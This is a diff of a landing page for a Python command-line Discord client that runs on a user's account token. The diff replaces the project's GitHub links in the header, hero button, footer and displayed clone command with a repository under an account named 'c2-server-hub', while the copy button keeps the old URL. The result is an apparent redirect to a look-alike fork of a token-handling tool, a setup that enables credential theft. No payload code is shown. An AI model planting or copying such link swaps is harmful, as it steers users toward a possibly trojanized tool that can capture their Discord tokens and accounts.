@@ -256,7 +256,7 @@ footer{border-top:1px solid var(--line);padding:46px 0 36px}
       <a href="#install">Install</a>
       <a href="#disclaimer">Disclaimer</a>
     </nav>
-    <a class="btn-gh" href="https://github.com/DiscordUtility/DiscordUtility" target="_blank" rel="noopener"><i class="fa-brands fa-github"></i>GitHub</a>
+    <a class="btn-gh" href="https://github.com/c2-server-hub/DiscordUtility" target="_blank" rel="noopener"><i class="fa-brands fa-github"></i>GitHub</a>
   </div>
 </header>
 
@@ -268,7 +268,7 @@ footer{border-top:1px solid var(--line);padding:46px 0 36px}
       <h1 class="reveal" style="transition-delay:.06s">Your Discord account,<br>from the <span class="hl">command line</span><span class="h1-cursor"></span></h1>
       <p class="hero-sub reveal" style="transition-delay:.12s">An open-source Python CLI that talks to Discord's REST API with a user token — browse your friends, send DMs, manage your servers… all without leaving your terminal.</p>
       <div class="hero-cta reveal" style="transition-delay:.18s">
-        <a class="btn btn-primary" href="https://github.com/DiscordUtility/DiscordUtility" target="_blank" rel="noopener"><i class="fa-brands fa-github"></i>Star on GitHub</a>
+        <a class="btn btn-primary" href="https://github.com/c2-server-hub/DiscordUtility" target="_blank" rel="noopener"><i class="fa-brands fa-github"></i>Star on GitHub</a>
         <button class="btn btn-ghost" id="demoBtn"><i class="fa-solid fa-terminal"></i>Try the live demo</button>
       </div>
       <p class="hero-meta reveal" style="transition-delay:.24s">v2.4.1 <i class="fa-solid fa-circle"></i> python 3.8+ <i class="fa-solid fa-circle"></i> MIT license <i class="fa-solid fa-circle"></i> one dependency: requests</p>
@@ -450,7 +450,7 @@ footer{border-top:1px solid var(--line);padding:46px 0 36px}
         <span class="step-num">01</span>
         <div>
           <h3>Clone the repository</h3>
-          <div class="code-line"><span class="txt"><i>$</i> git clone https://github.com/DiscordUtility/DiscordUtility.git</span><button class="copy-btn" data-copy="git clone https://github.com/DiscordUtility/DiscordUtility.git"><i class="fa-solid fa-copy"></i><span>copy</span></button></div>
+          <div class="code-line"><span class="txt"><i>$</i> git clone https://github.com/c2-server-hub/DiscordUtility</span><button class="copy-btn" data-copy="git clone https://github.com/DiscordUtility/DiscordUtility.git"><i class="fa-solid fa-copy"></i><span>copy</span></button></div>
         </div>
       </div>
       <div class="step">
@@ -502,7 +502,7 @@ footer{border-top:1px solid var(--line);padding:46px 0 36px}
     <div class="foot-top">
       <a class="logo" href="#"><span class="logo-mark"><i class="fa-solid fa-terminal"></i></span>Discord<b>Utility</b></a>
       <nav class="foot-links">
-        <a href="https://github.com/DiscordUtility/DiscordUtility" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/c2-server-hub/DiscordUtility" target="_blank" rel="noopener">GitHub</a>
         <a href="#features">Features</a>
         <a href="#commands">Commands</a>
         <a href="#install">Install</a>
@@ -526,7 +526,6 @@ let speedMul = 1; // accéléré si l'utilisateur clique pendant l'intro
 const sleep = ms => new Promise(r => setTimeout(r, ms * speedMul));
 const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 
-/* ---------- données simulées ---------- */
 const FRIENDS = [
   {n:'Nova',     t:'@nova',      id:'4281037460184', d:'03/12/2019', c:'#23a55a'},
   {n:'Aster',    t:'@asterdev',  id:'5192384711203', d:'21/04/2020', c:'#f0b232'},
